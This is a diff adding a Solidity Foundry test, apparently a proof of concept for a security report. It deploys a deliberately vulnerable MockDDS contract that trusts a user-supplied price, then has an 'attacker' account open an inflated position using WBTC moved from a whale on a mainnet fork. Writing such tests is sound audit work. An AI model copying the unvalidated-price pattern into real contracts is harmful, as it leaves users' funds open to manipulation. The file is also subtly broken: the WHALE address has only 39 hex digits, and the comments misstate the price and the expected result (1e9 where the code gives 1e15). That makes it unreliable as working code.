@@ -1,0 +1,91 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.20;
+
+import "forge-std/Test.sol";
+
+interface IWBTC {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    function approve(address spender, uint256 value) external returns (bool);
+    function mint(address to, uint256 amount) external returns (bool);
+    function owner() external view returns (address);
+    function mintingFinished() external view returns (bool);
+    function decimals() external view returns (uint8);
+}
+
+// Minimal DDS contract simulating the vulnerable system described in the report.
+// It accepts a user-supplied price when opening a position without any validation.
+contract MockDDS {
+    IWBTC public immutable wbtc;
+    mapping(address => uint256) public positions;
+
+    event PositionOpened(address indexed user, uint256 positionValue);
+
+    constructor(address _wbtc) {
+        wbtc = IWBTC(_wbtc);
+    }
+
+    function openPosition(uint256 price, uint256 collateralAmount) external {
+        require(collateralAmount > 0, "collateral must be >0");
+        // The position value is computed as collateral * price, assuming WBTC has 8 decimals.
+        // The vulnerability: the price parameter is completely unvalidated.
+        uint256 positionValue = collateralAmount * price / (10 ** uint256(wbtc.decimals()));
+        require(wbtc.transferFrom(msg.sender, address(this), collateralAmount), "transfer failed");
+        positions[msg.sender] += positionValue;
+        emit PositionOpened(msg.sender, positionValue);
+    }
+}
+
+contract ExploitTest is Test {
+    // WBTC on mainnet
+    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
+    // A known WBTC whale (holds ≈12k WBTC)
+    address constant WHALE = 0x28C6c06298d514Db08993407131E9a92B28e0b0;
+
+    IWBTC wbtc = IWBTC(WBTC);
+    MockDDS dds;
+    address attacker = makeAddr("attacker");
+
+    function setUp() public {
+        vm.label(WBTC, "WBTC");
+        vm.label(WHALE, "Whale");
+        vm.label(address(this), "TestContract");
+
+        // Ensure minting is no longer needed; we take WBTC from a whale instead.
+        // Give attacker some WBTC via the whale.
+        vm.startPrank(WHALE);
+        uint256 whaleBal = wbtc.balanceOf(WHALE);
+        require(whaleBal >= 1000 * 1e8, "whale insufficient WBTC");
+        wbtc.transfer(attacker, 1000 * 1e8); // 1000 WBTC
+        vm.stopPrank();
+
+        // Deploy the vulnerable DDS contract
+        dds = new MockDDS(WBTC);
+        vm.label(address(dds), "MockDDS");
+
+        // Approve DDS to spend attacker's WBTC.
+        vm.prank(attacker);
+        wbtc.approve(address(dds), type(uint256).max);
+    }
+
+    function testExploitArbitraryPrice() public {
+        // Simulate attacker passing an inflated price (e.g., 1e10 USD per WBTC)
+        uint256 inflatedPrice = 1_000_000 * 1e8; // $1M per WBTC in 8-decimal price unit
+        uint256 collateral = 10 * 1e8; // 10 WBTC
+
+        uint256 positionBefore = dds.positions(attacker);
+
+        vm.prank(attacker);
+        dds.openPosition(inflatedPrice, collateral);
+
+        uint256 positionAfter = dds.positions(attacker);
+        // With 10 WBTC collateral and inflated price, the position is coll * inflatedPrice / 1e8
+        uint256 expectedPosition = (collateral * inflatedPrice) / 1e8; // = 10 * 1e8 * 1e8 / 1e8 = 1e9
+        assertEq(positionAfter - positionBefore, expectedPosition, "Position should be set to inflated value");
+
+        // The attacker now has a massively overvalued position, demonstrating the vulnerability.
+    }
+}
+```
